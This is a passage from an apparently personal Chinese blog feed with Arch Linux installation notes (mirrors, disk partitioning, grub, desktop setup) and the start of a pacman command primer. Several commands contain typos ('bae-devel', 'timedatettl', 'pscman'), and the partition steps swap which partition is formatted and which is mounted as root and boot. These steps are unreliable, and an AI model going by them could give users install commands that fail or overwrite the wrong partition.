class="hljs-attr">name</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="使用-lshw-命令查看"><a href="#使用-lshw-命令查看" class="headerlink" title="使用 lshw 命令查看"></a>使用 lshw 命令查看</h5><p>lshw (list hardware) 可以查询到网卡对应的网卡驱动信息以及网卡驱动版本号:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">sudo lshw -<span class="hljs-keyword">class</span> <span class="hljs-symbol">network</span>  <br></code></pre></td></tr></table></figure><h4 id="查看网卡生产商"><a href="#查看网卡生产商" class="headerlink" title="查看网卡生产商"></a>查看网卡生产商</h4><p>先下载一些网络诊断工具:</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">pacman -S <span class="hljs-built_in">net</span>-tools<br></code></pre></td></tr></table></figure><p>先查看网卡信息:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ifconfig</span><br></code></pre></td></tr></table></figure><p>里面一串格式类似为: <code>00-00-00-AA-BB-CC</code> 的就是 MAC 地址.</p><p>得到一个网卡的 MAC 地址后，打开一个查询工具 (<a href="https://itool.co/mac">工具</a>) 输入 MAC 地址就可以查到网卡生产商的信息.</p><p>这里提一下 MAC 地址的结构，如 <code>A1-B2-C3-D4-E5-F6</code>, 前三个为厂商唯一，后三个为厂商分配的.</p><h2 id="更新系统时间"><a href="#更新系统时间" class="headerlink" title="更新系统时间"></a>更新系统时间</h2><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">timedatectl</span> <span class="hljs-built_in">set-ntp</span> <span class="hljs-string">true</span> <br><span class="hljs-string">timedatettl</span> <span class="hljs-string">status</span><br></code></pre></td></tr></table></figure><h2 id="配置-pacman"><a href="#配置-pacman" class="headerlink" title="配置 pacman"></a>配置 pacman</h2><p><code>pacman -S</code> 中 <code>S</code> 的含义是 “Synchronism”<br>配置文件为 <code>/etc/pacman.conf</code>, 其中，去除 <code>#Color</code> 前面的 <code>#</code> 注释符，<code>Color</code> 的意思是在安装软件包时，会给出彩色的提示，而不是黑白.</p><p>文件中:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gradle">[core]<br><span class="hljs-keyword">Include</span> = <span class="hljs-regexp">/etc/</span>pacman.d/mirrorlist<br>[extra]<br><span class="hljs-keyword">Include</span> = <span class="hljs-regexp">/etc/</span>pacman.d/mirrorlist<br>[community]<br><span class="hljs-keyword">Include</span> = <span class="hljs-regexp">/etc/</span>pacman.d/mirrorlist<br></code></pre></td></tr></table></figure><p>这些都代表 arch 的软件源. 这个 <code>mirrorlist</code> 里面记录的是 arch 软件源服务器的地址.</p><p>进入文件后把 China 的放在最顶上，因为 pacman 是从上往下读取.</p><p>利用 vim 的宏录制可以干很多重复的工作.</p><p>在 vim 中寻找空行为 <code>/^\n</code></p><p>archlinuxcn 中的源很多不是官方编译。</p><h2 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h2><p>先备份:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cp -a <span class="hljs-regexp">/etc/</span>pacman.d<span class="hljs-regexp">/mirrorlist /</span>etc<span class="hljs-regexp">/pacman.d/mi</span>rrorlist.bak <br></code></pre></td></tr></table></figure><p>添加华为的源和阿里云的源:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">Server = https:<span class="hljs-regexp">//</span>repo.huaweicloud.com<span class="hljs-regexp">/archlinux/</span><span class="hljs-variable">$repo</span><span class="hljs-regexp">/os/</span><span class="hljs-variable">$arch</span><br>Server = https:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/archlinux/</span><span class="hljs-variable">$repo</span><span class="hljs-regexp">/os/</span><span class="hljs-variable">$arch</span><br></code></pre></td></tr></table></figure><p>更新:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">pacman -Syy</span><br></code></pre></td></tr></table></figure><h2 id="使用-ssh-连接"><a href="#使用-ssh-连接" class="headerlink" title="使用 ssh 连接"></a>使用 ssh 连接</h2><p>使用 <code>ssh</code> 连接后安装比较方便, 因此先:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># pacman -Syy openssh</span><br></code></pre></td></tr></table></figure><p>启动 <code>sshd</code>:</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-params">system</span>ctl enable sshd<br><span class="hljs-params">system</span>ctl start sshd<br><span class="hljs-params">system</span>ctl status sshd<br></code></pre></td></tr></table></figure><p>先修改一下 root 密码，方便连接:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">passwd root</span> <br></code></pre></td></tr></table></figure><p>然后回到自己的终端进行 ssh 连接:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>ssh root<span class="hljs-variable">@ip</span><br></code></pre></td></tr></table></figure><p>这个 ip 后面没有端口号.</p><h2 id="磁盘分区及格式化"><a href="#磁盘分区及格式化" class="headerlink" title="磁盘分区及格式化"></a>磁盘分区及格式化</h2><p>先用 <code>fdisk -l</code> 命令查看磁盘位置, 然后用 <code>fdisk</code> 命令直接分区。如 <code>fdisk /dev/vda</code></p><p>之后格式化磁盘, <code>boot</code> 分区格式化为 <code>fat32</code>，如 <code>mkfs.fat -F 32 /dev/vda2</code></p><p><code>/</code> 根目录分区格式化为 <code>ext4</code>, 如 <code>mkfs.ext4 /dev/vda1</code></p><p>将分区挂载，先挂载 <code>/</code> 根分区到 <code>/mnt</code> 目录:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">mount /dev/vda2 /mnt</span><br></code></pre></td></tr></table></figure><p>然后将 <code>boot</code> 分区挂载到 <code>/mnt/boot</code>, 先得创建一个目录:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"># mkdir <span class="hljs-regexp">/mnt/</span>boot<br># mount <span class="hljs-regexp">/dev/</span>vda1 <span class="hljs-regexp">/mnt/</span>boot<br></code></pre></td></tr></table></figure><h2 id="安装系统"><a href="#安装系统" class="headerlink" title="安装系统"></a>安装系统</h2><p>安装几个工具:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># pacstrap /mnt base bae-devel linux linux-firmware dhcpcd e2fsprogs iwd</span><br></code></pre></td></tr></table></figure><p><code>base</code> 包包含 20 来个基础的软件.</p><p><code>linux</code> 是 linux 内核。</p><p><code>linux-firmware</code> 是 linux 的框架.</p><p><code>base-devel</code> 中也同样有重要的 packages, 比如 GCC 和 make.</p><p>这里 <code>dhcpcd</code> 是用来动态获取 ip 的。</p><p><code>e2fsprogs</code> 是一个 Ext2 (及 Ext3&#x2F;4) 文件系统工具，它包含了诸如创建、修复、配置、调试 ext2 文件系统等的标准工具.</p><p><code>iwd</code> 是 iNet Wireless Daemon 项目，旨在基于 Linux 设备提供全面的 Wi-Fi 连接解决方案。<br>pacstrap 是一个脚本，它会往一个文件夹里面安装你想要的软件，当前未将根目录挂载到 <code>/mnt</code> 时，其所在环境为启动盘所在的位置而不是系统盘. 因此需要把根目录挂载. </p><h3 id="生成文件系统表"><a href="#生成文件系统表" class="headerlink" title="生成文件系统表"></a>生成文件系统表</h3><p>用于自动挂载分区，不然系统无法正常启动.</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"># genfstab -U <span class="hljs-regexp">/mnt &gt;&gt; /m</span>nt<span class="hljs-regexp">/etc/</span>fstab<br># cat <span class="hljs-regexp">/mnt/</span>etc/fstab<br></code></pre></td></tr></table></figure><p>执行以下命令进入到我们安装的系统，对系统进行配置:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">arch-chroot /mnt</span><br></code></pre></td></tr></table></figure><h3 id="设置时区"><a href="#设置时区" class="headerlink" title="设置时区"></a>设置时区</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">ln -sf <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/zoneinfo/</span>Asia<span class="hljs-regexp">/Shanghai /</span>etc/localtime<br><span class="hljs-comment"># 同步硬件时钟</span><br>hwclock --systohc<br></code></pre></td></tr></table></figure><h3 id="本地化"><a href="#本地化" class="headerlink" title="本地化"></a>本地化</h3><p>Local 明确规定了地域、货币、时区日期的格式、字符排列方式和其他本地化标准.</p><p>生成 Local 信息</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">sed -i <span class="hljs-string">&#x27;s/^#en_US.UTF-8/en_US.UTF-8/&#x27;</span> <span class="hljs-regexp">/etc/</span>locale.gen<br>sed -i <span class="hljs-string">&#x27;s/^#zh_CN.UTF-8/zh_CN.UTF-8/&#x27;</span> <span class="hljs-regexp">/etc/</span>locale.gen<br>locale-gen<br></code></pre></td></tr></table></figure><p>创建 locale.conf 文件，并编辑设定 LANG 变量:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">echo <span class="hljs-string">&quot;LANG=en_US.UTF-8&quot;</span> &gt;&gt; <span class="hljs-regexp">/etc/</span>locale.conf<br></code></pre></td></tr></table></figure><p>主机名配置:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">echo <span class="hljs-string">&quot;ArchLinux&quot;</span> &gt;&gt; <span class="hljs-regexp">/etc/</span>hostname<br></code></pre></td></tr></table></figure><p>生成对应 hosts, 将 <code>hostname</code> 换成自己设置的:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">echo -e <span class="hljs-string">&quot;127.0.0.1 localhost\n::1 localhost\n127.0.1.1 hostname.localdomain hostname&quot;</span> &gt;&gt; <span class="hljs-regexp">/etc/</span>hosts<br></code></pre></td></tr></table></figure><p>设置 root 密码:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">passwd root</span><br></code></pre></td></tr></table></figure><h3 id="安装引导程序"><a href="#安装引导程序" class="headerlink" title="安装引导程序"></a>安装引导程序</h3><p>安装 Linux 引导加载程序，才能在安装后启动系统.</p><h4 id="安装徽码"><a href="#安装徽码" class="headerlink" title="安装徽码"></a>安装徽码</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># amd 电脑安装</span><br><span class="hljs-attribute">pacman</span> -S amd-ucode<br><span class="hljs-comment"># intel 电脑安装</span><br>pacman -S intel-ucode<br></code></pre></td></tr></table></figure><p>其中 <code>intel-ucode</code> 是厂家或程序提供商来为你的电脑 cpu 更新一些驱动.</p><h4 id="配置-grub"><a href="#配置-grub" class="headerlink" title="配置 grub"></a>配置 grub</h4><p>Arch 使用 grub2 管理引导，安装相关程序:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">pacman -S grub efibootmgr efivar os-prober</span><br></code></pre></td></tr></table></figure><h4 id="安装引导"><a href="#安装引导" class="headerlink" title="安装引导"></a>安装引导</h4><p>在安装 <code>grub</code> 之前，需要先确认系统架构是什么.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">uname</span> -m</span><br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">grub-install <span class="hljs-attribute">--target</span>=x86_64-efi <span class="hljs-attribute">--efi-directory</span>=/boot <span class="hljs-attribute">--bootloader-id</span>=Arch --recheck<br><span class="hljs-comment"># --bootloader-id=name 中的name可改</span><br></code></pre></td></tr></table></figure><p>grub2 默认禁用了 os-prober, 如果是选择双系统或多系统安装，需手动开启该选项。</p><p>os-prober 可以检查其他硬盘上的其他系统引导, 如果不开启，可能无法识别其他系统.</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">echo <span class="hljs-string">&quot;GRUB_DISABLE_OS_PROBER=false&quot;</span> &gt;&gt; <span class="hljs-regexp">/etc/</span><span class="hljs-keyword">default</span>/grub <br></code></pre></td></tr></table></figure><h4 id="生成引导配置文件"><a href="#生成引导配置文件" class="headerlink" title="生成引导配置文件"></a>生成引导配置文件</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">grub-mkconfig -o <span class="hljs-regexp">/boot/g</span>rub/grub.cfg<br></code></pre></td></tr></table></figure><h3 id="配置开机启动项"><a href="#配置开机启动项" class="headerlink" title="配置开机启动项"></a>配置开机启动项</h3><p>开机后自动连接网络, 需下载联网程序并设置开机自启动:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 下载 wifi 管理</span><br>pacman -S dhcpcd iwd networkmanager<br><span class="hljs-comment"># 设置启动项</span><br>systemctl <span class="hljs-built_in">enable</span> dhcpcd<br>systemctl <span class="hljs-built_in">enable</span> iwd<br>systemctl <span class="hljs-built_in">enable</span> NetworkManager<br></code></pre></td></tr></table></figure><h3 id="ARU-添加-ArchlinuxCN"><a href="#ARU-添加-ArchlinuxCN" class="headerlink" title="ARU 添加 ArchlinuxCN"></a>ARU 添加 ArchlinuxCN</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># /etc/pacman.conf</span><br>[archlinux]<br>Server = http:<span class="hljs-regexp">//mi</span>rror.lzu.edu.cn<span class="hljs-regexp">/archlinuxcn/</span><span class="hljs-variable">$arch</span><br></code></pre></td></tr></table></figure><p>去掉 <code># Color</code> 前的注释符.</p><p>然后更新一下:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -Syy</span> <br></code></pre></td></tr></table></figure><p>若报错则需获取 gpg 密钥:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">rm -rf <span class="hljs-regexp">/etc/</span>pacman.d<span class="hljs-regexp">/gnupg/</span><br>pacman-key --init<br>pacman-key --populate archlinux archlinuxcn<br>pacman -Syy<br></code></pre></td></tr></table></figure><h3 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 退出 arch root 安装环境</span><br><span class="hljs-keyword">exit</span> <br><span class="hljs-comment"># 取消挂载</span><br>umount -R /mnt<br><span class="hljs-comment"># 重启</span><br>reboot<br></code></pre></td></tr></table></figure><h3 id="若-win-和-Ubuntu-的引导记录在-grub-中消失"><a href="#若-win-和-Ubuntu-的引导记录在-grub-中消失" class="headerlink" title="若 win 和 Ubuntu 的引导记录在 grub 中消失"></a>若 win 和 Ubuntu 的引导记录在 grub 中消失</h3><p>实际上的引导记录还是存在的，可以通过 <code>/etc/efi</code> 目录下查看.</p><p>要找到启动 Ubuntu 和 Win 的方法，可以在 BIOS 中进行顺序的切换.</p><h3 id="新建用户"><a href="#新建用户" class="headerlink" title="新建用户"></a>新建用户</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">useradd -m -G wheel -s <span class="hljs-regexp">/bin/</span>bash &lt;username&gt;<br></code></pre></td></tr></table></figure><p>设置用户密码:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">passwd <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><br></code></pre></td></tr></table></figure><p>赋予用户 sudo 权限, 修改 <code>/etc/sudoers</code> 文件, 去掉 <code>%wheel</code> 行之前的注释. 需要先修改文件权限。</p><h3 id="安装-dwm-窗口管理器"><a href="#安装-dwm-窗口管理器" class="headerlink" title="安装 dwm 窗口管理器"></a>安装 dwm 窗口管理器</h3><p><a href="https://www.cnblog.com/language/p/154415">参考博客</a><br><a href="https://b23.tv/F1W9Gmm">参考b站</a><br>先说一个误会，自己在参考一个视频后拉取了别人的 pwm 仓库，然后安装后不知道如何使用，重新安装原始包即可.</p><h4 id="桌面环境与窗口管理器概述"><a href="#桌面环境与窗口管理器概述" class="headerlink" title="桌面环境与窗口管理器概述"></a>桌面环境与窗口管理器概述</h4><p>桌面环境会提供很多工具。大多数桌面环境包括一整套整合应用程序和使用工.</p><p>窗口管理器仅仅用于管理窗口，安装了窗口管理器之后就可以不用安装桌面环境.</p><h4 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h4><p>有些可能在前面以经安装好了:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">pacman -S acpi usbutils pciutils</span><br></code></pre></td></tr></table></figure><ul><li><p><code>acpi</code> 是用来查看电池电量的工具。</p></li><li><p><code>usbutils</code> 是用来查看系统 USB 设备.</p></li><li><p><code>pciutils</code> 用来查看系统 PCI 设备。</p></li></ul><p>安装驱动:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">pacman -S xf86-vedio-<span class="hljs-built_in">int</span>el mesa xf86-input-libinput<br></code></pre></td></tr></table></figure><p>这三个好像本就安装好了的，因为我在下载的时候显示的是 <code>reinstall</code>.</p><ul><li><p><code>xf86-vedio-intel</code> 是显核的驱动.</p></li><li><p><code>mesa</code> 是用来配合显卡的另一种上层驱动.</p></li><li><p><code>xf86-input-libinput</code> 是笔记本触摸板的驱动.</p></li></ul><p>安装X窗口系统的相关服务:</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pacman -S <span class="hljs-keyword">xorg </span><span class="hljs-keyword">xorg-xinit </span><span class="hljs-keyword">xorg-server </span>xwallpaper picom<br></code></pre></td></tr></table></figure><ul><li><code>xorg</code> 是 X 服务，用来显示图形界面</li><li><code>xorg-xinit</code> 是 X 服务的启动程序</li><li><code>xwallpaper</code> 用于更换壁纸</li><li><code>picom</code> 窗口渲染，后面做半透明渲染</li></ul><h4 id="安装窗口管理器"><a href="#安装窗口管理器" class="headerlink" title="安装窗口管理器"></a>安装窗口管理器</h4><p>安装 suckless 全家桶:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://git.suckless.org/dwm --<span class="hljs-attr">depth=</span><span class="hljs-number">1</span> <br>git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://git.suckless.org/st --<span class="hljs-attr">depth=</span><span class="hljs-number">1</span> <br>git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://git.suckless.org/dmenu --<span class="hljs-attr">depth=</span><span class="hljs-number">1</span> <br></code></pre></td></tr></table></figure><p>分别进入这几个下载下来的目录，并执行 <code>sudo make clean install</code>.</p><p>在家目录下创建 <code>.xinitrc</code> 文件并添加 <code>exec dwm</code>.</p><h4 id="安装亮度控制和-Night-Mode"><a href="#安装亮度控制和-Night-Mode" class="headerlink" title="安装亮度控制和 Night Mode"></a>安装亮度控制和 Night Mode</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -S brightnessctl redshift</span><br></code></pre></td></tr></table></figure><p>在 <code>.xinitrc</code> 文件中添加 <code>brightnessctl set 20% &amp;</code> 和 <code>redshift -P -O 4800 &amp;</code></p><p>同样在 <code>.xinitrc</code> 中添加 <code>picom &amp;</code></p><h3 id="安装-lightdm-服务"><a href="#安装-lightdm-服务" class="headerlink" title="安装 lightdm 服务"></a>安装 lightdm 服务</h3><p><code>lightdm</code> 是一个 display manager，也就是提供一个登录界面.</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">sudo pacman -S lightdm lightdm-webkit2-greeter lightdm-webkit-theme-litarvan<br></code></pre></td></tr></table></figure><p>其配置文件位置为 <code>/etc/lightdm/lightdm.conf</code> 修改该配置文件，修改 <code>greeter-session</code> 的为 <code>greeter-session=lightdm-webkit2-greeter</code>.</p><p>接着修改 <code>/etc/lightdm/lightdm-webkit2-greeter.conf</code> 将 <code>detect_theme_errors</code> 的值改为 <code>false</code>. <code>webkit_theme</code> 的值改为 <code>litarvan</code>.</p><h3 id="安装-kde-桌面环境"><a href="#安装-kde-桌面环境" class="headerlink" title="安装 kde 桌面环境"></a>安装 kde 桌面环境</h3><p>先安装依赖的 xorg 包.</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">sudo pacman -S <span class="hljs-keyword">xorg </span><span class="hljs-keyword">xorg-server </span><span class="hljs-keyword">xorg-xinit</span><br></code></pre></td></tr></table></figure><p>最小安装 kde 和 plasma 桌面:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">sudo pacman -S plasma-<span class="hljs-keyword">meta</span> sddm<br></code></pre></td></tr></table></figure><p>之前装的 <code>kde-applications-meta</code> 里面是应用，不是桌面环境. 详情见<a href="https://wiki.archlinux.org/title/KDE">ArchWiki</a></p><p>sddm 是 kde 使用的登录管理器.</p><p>设置 sddm 的开机启动:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo systemctl <span class="hljs-built_in">enable</span> sddm<br></code></pre></td></tr></table></figure><p>下载一些应用:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx">  <span class="hljs-attribute">sudo</span> pacman -S konsole alacritty dolphin ark gwenview lolcat sl neofetch<br><span class="hljs-comment"># konsole 和 alacritty 都是终端</span><br><span class="hljs-comment"># dolphin 是文件管理器</span><br><span class="hljs-comment"># ark 是归档管理器，就是解压缩的</span><br><span class="hljs-comment"># gwenview 是看图片的</span><br><span class="hljs-comment"># lolcat neofetch 和 sl 是防止你打开终端没事干</span><br></code></pre></td></tr></table></figure><h3 id="国内开发的桌面环境有-deepin"><a href="#国内开发的桌面环境有-deepin" class="headerlink" title="国内开发的桌面环境有 deepin"></a>国内开发的桌面环境有 deepin</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">pscman -S deepin deepin-extra</span><br></code></pre></td></tr></table></figure><p>这是一个已经配置好的皮肤，附带很多软件.</p><p>将 <code>/etc/lightdm/k=lightdm.conf</code> 中 <code>greeter-session</code> 改为:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">greeter-session</span><span class="hljs-operator">=</span>lightdm-deepin-greeter<br></code></pre></td></tr></table></figure><h3 id="TLP"><a href="#TLP" class="headerlink" title="TLP"></a>TLP</h3><p>用于管理电池.</p><h3 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h3><p>进入一个 b 站 up 的 github 页面– <a href="https://github.com/theniceboy">主页</a></p><h3 id="网易云"><a href="#网易云" class="headerlink" title="网易云"></a>网易云</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">yay -S netease-cloud-music</span><br></code></pre></td></tr></table></figure><h3 id="百度网盘"><a href="#百度网盘" class="headerlink" title="百度网盘"></a>百度网盘</h3>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki 中 pacman 部分</title>
    <link href="/2022/08/30/ArchWiki-%E4%B8%AD-pacman-%E9%83%A8%E5%88%86/"/>
    <url>/2022/08/30/ArchWiki-%E4%B8%AD-pacman-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Pacman">ArchWiki</a></p><p>pacman 的目标是简化对软件包的管理。</p><p>pacman 用 C 语言编写，并使用 tar 作为打包格式.</p><p>似乎是，官方的软件仓库的内容可直接用 pacman 下载.</p><p>运行 <code>pacman -Ql pacman | grep -E &#39;bin/.+&#39;</code> 可查看完整的工具列表。</p><p><code>pacman-contrib</code> 软件包包含一些有用的工具。</p><p><a href="https://wiki.archlinux.org/title/Pacman/Rosetta">pacman 和其他包管理器对比</a></p><p>在 Arch 上安装软件包时，避免在还没有更新系统前刷新同步软件包列表.</p><p>更新软件包:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>pacman -Syy<br></code></pre></td></tr></table></figure><h1 id="pacman-配置"><a href="#pacman-配置" class="headerlink" title="pacman 配置"></a>pacman 配置</h1><p>配置文件在 <code>/etc/pacman.conf</code>.</p><p>在末尾添加的:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">Include</span> = <span class="hljs-regexp">/etc/</span>pacman.d/archlinux<br></code></pre></td></tr></table></figure><p>这个 <code>Include</code> 就是引入后面这个文件.</p><h1 id="各种指令和小技巧"><a href="#各种指令和小技巧" class="headerlink" title="各种指令和小技巧"></a>各种指令和小技巧</h1><p>主要分为三大类:</p><ul><li><code>-S</code>, Synchronize, 安装</li><li><code>-R</code>, Remove, 删除</li><li><code>-Q</code>, Query, 查询本地的软件</li></ul><p>一般后面都要跟 1~2 个小写字母.</p><h2 id="和-S-相关"><a href="#和-S-相关" class="headerlink" title="和 -S 相关"></a>和 <code>-S</code> 相关</h2><p><code>sudo pacman -Sy</code> 这个是获取最新的软件信息.</p><p><code>sudo pacman -Syy</code> 这个是强制更新软件库.</p><p>但以上两个不会实际更新你的软件.</p><p><code>sudo pacman -Su</code> 这个 <code>u</code> 是 update.</p><p><code>sudo pacman -Syu</code> 就会刷新软件库并更新软件.</p><p><code>sudo pacman -Ss</code> 这个 <code>s</code> 就是 search. 用来查询</p><p>pacman 在下在完一个软件包之后, 会将安装包留在本地, <code>sudo pacman -Sc</code> 会删除缓存.</p><h2 id="和-R-相关"><a href="#和-R-相关" class="headerlink" title="和 -R 相关"></a>和 <code>-R</code> 相关</h2><p><code>sudo pacman -R +软件名</code> 这条命令不会删除相关依赖.</p><p><code>sudo pacman -Rs +软件名</code> 这条命令会删除相关依赖.</p><p><code>sudo pacman -Rns +软件名</code> 会删除全局的配置文件, 但你 local 的如 .vimrc 不会被删除. </p><h2 id="和-Q-相关"><a href="#和-Q-相关" class="headerlink" 